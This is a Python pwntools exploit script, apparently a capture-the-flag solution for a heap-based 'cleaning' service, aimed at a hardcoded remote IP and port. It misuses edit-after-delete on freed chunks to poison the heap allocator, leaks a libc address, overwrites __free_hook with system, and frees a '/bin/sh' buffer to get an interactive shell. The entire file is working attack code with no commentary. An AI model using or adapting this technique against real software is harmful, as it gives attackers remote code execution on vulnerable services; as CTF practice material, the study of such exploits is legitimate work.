# https://pastebin.com/raw/n1GMyrnv
from pwn import *
from pwnlib.util.proc import wait_for_debugger

# libc_elf = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# libc_elf = ELF('../libc6-amd64_2.30-0ubuntu2_i386.so')
libc_elf = ELF('libc6_2.30-0ubuntu2_amd64.so')
chall_elf = ELF('main')



def start():
    return remote('52.73.40.215', 1028)
    # return process(['./hcleaning'], env={})


def write(p, text):
    p.sendline('1\n{}'.format(len(text)))
    p.recvuntil('Enter name:')
    p.sendline(text)
    p.recvuntil('customer : ')
    addr = int(p.recvline(), 16)
    p.recvuntil('>')
    return addr


def show(p, index, recv=True):
    p.sendline('4\n{}'.format(index))
    p.recvuntil("Customer's name:")
    res = p.recvline()[:-1]
    if recv:
        p.recvuntil('>')
    return res


def edit(p, index, text):
    p.sendline('2\n{}\n{}'.format(index, len(text)))
    p.recvuntil('new length:')
    p.sendline(text)
    p.recvuntil('>')


def delete_all(p, recv=True):
    p.sendline('5')
    if recv:
        p.recvuntil('>')


def main():
    p = start()  # type: process

    if hasattr(p, 'pid'):
        print(open('/proc/{}/maps'.format(p.pid), 'r').read())

    p.recvuntil('>')  # Ignore start message.
    addrs = []
    addrs.append(write(p, 'b' * 0x78))
    delete_all(p)
    edit(p, 0, 'a' * 0x10)
    edit(p, 0, p64(addrs[0]))
    delete_all(p)
    edit(p, 0, 'a' * 0x10)
    edit(p, 0, p64(addrs[0]))

    addrs.append(write(p, 'a' * 0x1000))
    addrs.append(write(p, 'b' * 0x20))
    delete_all(p)
    addr_line = show(p, 1)
    libc_addr = u64(addr_line.ljust(8, '\0'))
    libc_elf.address = libc_addr - (libc_elf.symbols['__malloc_hook'] - libc_elf.address) - 112

    log.progress(hex(libc_addr))
    log.progress(hex(libc_elf.address))

    log.progress(hex(libc_elf.symbols['__free_hook']))
    log.progress(hex(write(p, p64(libc_elf.symbols['__free_hook']) + 'f' * 0x70)))
    log.progress(hex(write(p, '/bin/sh\0' + 'f' * 0x70)))

    ong_gadget = libc_elf.symbols['system']
    log.progress(hex(write(p, p64(ong_gadget) + 'a' * 0x70)))
    delete_all(p, recv=False)

    p.interactive()
    return


if __name__ == '__main__':
    main()
